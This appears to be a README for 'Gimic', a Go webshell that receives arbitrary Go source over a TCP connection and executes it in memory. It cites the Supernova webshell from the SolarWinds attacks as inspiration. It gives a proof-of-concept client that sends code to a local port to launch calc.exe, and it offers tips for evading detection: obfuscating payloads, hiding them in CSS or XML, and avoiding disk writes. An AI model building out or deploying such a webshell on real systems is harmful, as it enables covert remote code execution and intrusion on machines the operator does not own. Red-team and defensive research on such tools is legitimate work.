# Gimic
Gimic is a go based webshell that will interpret and execute arbitrary go source code in memory transmitted via http/tcp connection.

Inspiration came from the Supernova Webshell found as part of the recent Solarwinds attacks, exposing compilers/interpreters is a neat trick.

This is a very rudimentary POC, to use in a red team context I would build out an api exposing a few endpoints, encode and obfuscate my go source to be transferred,
maybe embed the obfuscated code in some css or xml, something people dont like to read. 

Did some preliminary examination with procmon to see if the transmitted payloads are being written to disk and I wasnt able to detect any, but some forensics people may have more luck than I did.


#POC

```
package main

import (
	"fmt"
	"log"
	"net"
)

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:31337")
	if err != nil {
		log.Println(err)
	}
	testscript := `package main

import (
	"os/exec"
	"fmt"
)

func main() {
	cmd := exec.Command("C:\\Windows\\System32\\calc.exe")
	cmd.Run()
	fmt.Println("done")
}`
	fmt.Fprintf(conn, testscript+"\r\n\r\n")
}
```

For even more fun, bundle this with https://medium.com/@shantanukhande/red-team-how-to-embed-golang-tools-in-c-e269bf33876a
